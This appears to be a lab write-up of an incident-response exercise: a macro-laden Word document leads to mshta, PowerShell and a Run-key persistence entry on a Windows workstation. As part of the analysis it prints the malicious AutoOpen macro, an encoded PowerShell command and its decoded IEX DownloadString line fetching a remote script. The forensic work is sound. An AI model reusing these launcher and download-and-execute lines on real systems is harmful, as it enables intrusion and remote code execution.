# TryHackMe — Investigating Script-Based Executions

**Room:** [Investigating Script-Based Executions](https://tryhackme.com/room/scriptexecutionwinir)  
**Category:** DFIR / Windows Incident Response  
**Difficulty:** Medium  
**Author:** h4rdin  

---

## Scenario

A workstation (**OTT-WS-04**) at **Otters Financial Group** was flagged by the SOC after detecting outbound connections to an unfamiliar host, unexpected child processes spawned from Microsoft Office, and unauthorized changes to autostart configuration. Our job: trace the kill-chain from initial access to persistence and recover all IOCs.

---

## Kill-Chain Summary

```
Phishing Delivery
  └─ Macro-enabled document emailed to j.smith
       └─ Enable Content → AutoOpen fires → WINWORD.EXE spawns mshta.exe
            └─ mshta.exe fetches stage2.hta from C2 (fileless proxy execution)
                 └─ stage2.hta writes Run key for persistence + launches PowerShell
                      └─ powershell.exe -enc <base64> → downloads a.ps1 from C2
```

---

## MITRE ATT&CK Mapping

| Technique | TID | Evidence |
|-----------|-----|----------|
| Spearphishing Attachment | T1566.001 | `.docm` delivered via email to j.smith |
| User Execution: Malicious File | T1204.002 | TrustRecords confirm "Enable Content" click |
| Command and Scripting Interpreter: VBA | T1059.005 | `VBE7.DLL` loaded by WINWORD.EXE (Prefetch) |
| System Binary Proxy Execution: Mshta | T1218.005 | `mshta.exe https://185.126.57.11/stage2.hta` |
| Command and Scripting Interpreter: PowerShell | T1059.001 | `powershell.exe -nop -w hidden -enc <base64>` |
| Ingress Tool Transfer | T1105 | `IEX (New-Object Net.WebClient).DownloadString(...)` |
| Obfuscated Files or Information | T1027 | Base64(UTF-16LE) encoded PowerShell command |
| Boot/Logon Autostart: Registry Run Keys | T1547.001 | `OneDriveUpd` Run key pointing to mshta + C2 URL |

---

## Artifacts & Analysis

### 1. Prefetch — WINWORD.EXE (PECmd)

**Tool:** `PECmd.exe -f "...\WINWORD.EXE-AB6EC2FA.pf"`

| Finding | File Reference # | Significance |
|---------|-----------------|--------------|
| `VBE7.DLL` | #220 | VBA runtime loaded → macro was **executed**, not just present |
| `VBEUI.DLL` + `VBE7INTL.DLL` | #227, #235 | VBA Editor UI components confirm full VBA activation |
| `NDA_AMENDMENT_MAY2020_FINAL.DOCM` | #318 | Malicious document, opened from `\Downloads\` |
| `NDA_...DOCM:ZONE.IDENTIFIER` | #314 | MOTW present → file came from the internet |
| `FE1C4C9A.DOCM` (OICE sandbox) | #191 | Document passed through Protected View before Enable Content |
| `MSHTA.EXE` | #377 | Word accessed mshta.exe → macro spawned proxy execution |
| `WSHOM.OCX` | #368 | WScript.Shell COM object loaded → `CreateObject("WScript.Shell")` |
| `SCRRUN.DLL` | #370 | FileSystemObject loaded → file system access from macro |
| `AMSI.DLL` | #194 | AMSI scanned the macro content (did not block) |
| `WININET.DLL` / `URLMON.DLL` | #252, #160 | Network DLLs → outbound HTTP connection for payload fetch |

**Run count:** 6 | **First run:** 2026-07-14 00:48:54 | **Last run:** 2026-07-14 02:00:20

### 2. Macro Analysis (olevba)

**Tool:** `python -m oletools.olevba NDA_Amendment_May2020_Final.docm`

**Extracted VBA code:**

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Run _
        "mshta.exe https://185.126.57.11/stage2.hta", 0, False
End Sub
```

**olevba classification:**

| Type | Count | Keywords |
|------|-------|----------|
| AutoExec | 1 | `AutoOpen` |
| Suspicious | 4 | `Shell`, `WScript.Shell`, `Run`, `CreateObject` |
| IOC | 4 | URL (`https://185.126.57.11/stage2.hta`), IP (`185.126.57.11`), `mshta.exe`, `stage2.hta` |

**Note:** The `.Run` parameter `0` = `vbHide` (window hidden), `False` = async (macro does not wait for mshta to finish).

### 3. Registry — Persistence (RECmd)

**Tool:** `RECmd.exe -f "...\j.smith\NTUSER.DAT" --kn "Software\Microsoft\Windows\CurrentVersion\Run"`

```
Key last write: 2026-07-14 02:00:29

Value #0: OneDrive     → legitimate OneDrive autostart
Value #1: OneDriveUpd  → mshta.exe https://185.126.57.11/stage2.hta   ← PERSISTENCE
```

The attacker named the Run key `OneDriveUpd` to mimic the legitimate `OneDrive` entry sitting right next to it — a classic blending technique to evade manual review.

**Timeline correlation:** Run key written at `02:00:29`, exactly 9 seconds after the last WINWORD.EXE run (`02:00:20`).

### 4. Event Logs — Process Chain (Sysmon EID 1 + Security EID 4688)

**Tool:** `Get-WinEvent -Path "OTT-WS-04_Events.evtx"`

**Process tree reconstructed from Sysmon Event ID 1:**

```
WINWORD.EXE
  └─ mshta.exe (PID 2800)
       CommandLine: mshta.exe https://185.126.57.11/stage2.hta
       └─ powershell.exe (PID 2436)
            CommandLine: powershell.exe -nop -w hidden -enc <base64>
            └─ conhost.exe (PID 3748)
                 CommandLine: conhost.exe 0xffffffff -ForceV1
```

**All events timestamped at:** `2026-07-14 02:00:29`  
**User context:** `OTT-WS-04\j.smith`

### 5. PowerShell Payload Decoding

**Encoded command (Base64 → UTF-16LE):**

```
SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi
AEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
KAAnAGgAdAB0AHAAcwA6AC8ALwAxADgANQAuADEAMgA2AC4ANQA3AC4AMQAxAC8AYQAuAHAAcwAxACcAKQA=
```

**Decoded:**

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://185.126.57.11/a.ps1')
```

**Decoding method:**

```bash
echo '<base64>' | base64 -d | iconv -f UTF-16LE -t UTF-8
```

PowerShell `-EncodedCommand` requires Base64(UTF-16LE) — each ASCII character is 2 bytes (little-endian), then the byte stream is Base64-encoded. The characteristic `AA` padding in the raw base64 is the giveaway for UTF-16LE encoding.

---

## Indicators of Compromise (IOCs)

| Type | Value |
|------|-------|
| C2 IP | `185.126.57.11` |
| C2 URL (stage 2) | `https://185.126.57.11/stage2.hta` |
| C2 URL (stage 3) | `https://185.126.57.11/a.ps1` |
| Malicious Document | `NDA_Amendment_May2020_Final.docm` |
| Persistence Key | `HKCU\...\Run\OneDriveUpd` |
| Affected User | `OTT-WS-04\j.smith` |
| Affected Host | `OTT-WS-04` |

---

## DFIR Tooling Used

| Tool | Purpose |
|------|---------|
| **PECmd** (Eric Zimmerman) | Parse Prefetch `.pf` files — execution evidence, referenced DLLs/files, run counts, timestamps |
| **RECmd** (Eric Zimmerman) | Offline registry hive analysis — Run keys, TrustRecords from NTUSER.DAT |
| **olevba** (oletools) | Static VBA macro extraction and classification from Office documents |
| **Get-WinEvent** (PowerShell) | Parse `.evtx` event logs — Sysmon EID 1 process creation, Security EID 4688 |
| **KAPE** (Kroll) | Triage collection of forensic artifacts from the compromised host |

---

## Lessons Learned

1. **VBE7.DLL in Prefetch is the smoking gun** — its presence in WINWORD.EXE's referenced files proves macro execution occurred, even if the document has been deleted. No VBE7.DLL = no VBA execution.

2. **Prefetch survives payload deletion** — the `.pf` file recorded `MSHTA.EXE`, `WSHOM.OCX`, and the document path even though the HTA payload was fileless. Attackers who rely on fileless techniques still leave execution traces in Prefetch.

3. **Transaction logs matter** — RECmd replayed `.LOG1` and `.LOG2` before parsing the hive. Without this step, the persistence key written in the final seconds before triage collection could have been missed.

4. **Naming mimicry is cheap but effective** — `OneDriveUpd` next to legitimate `OneDrive` in the Run key. During triage, always compare every Run value against known-good baselines rather than skimming names.

5. **Three independent artifacts confirm macro execution** — TrustRecords (user clicked Enable Content), VBE7.DLL in Prefetch (VBA runtime loaded), and Sysmon EID 1 (WINWORD.EXE → mshta.exe parent-child). Redundancy in evidence is key for incident reports and DORA regulatory filings.

6. **The entire attack — from document open to persistence — completed in under 10 seconds** (02:00:20 → 02:00:29). Detection must be automated; no human analyst can respond in this window.

---

## References

- [MITRE ATT&CK: Mshta (T1218.005)](https://attack.mitre.org/techniques/T1218/005/)
- [MITRE ATT&CK: VBA (T1059.005)](https://attack.mitre.org/techniques/T1059/005/)
- [MITRE ATT&CK: Registry Run Keys (T1547.001)](https://attack.mitre.org/techniques/T1547/001/)
- [Eric Zimmerman Tools](https://ericzimmerman.github.io/)
- [oletools documentation](https://github.com/decalage2/oletools)
- [NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response](https://csrc.nist.gov/publications/detail/sp/800-86/final)
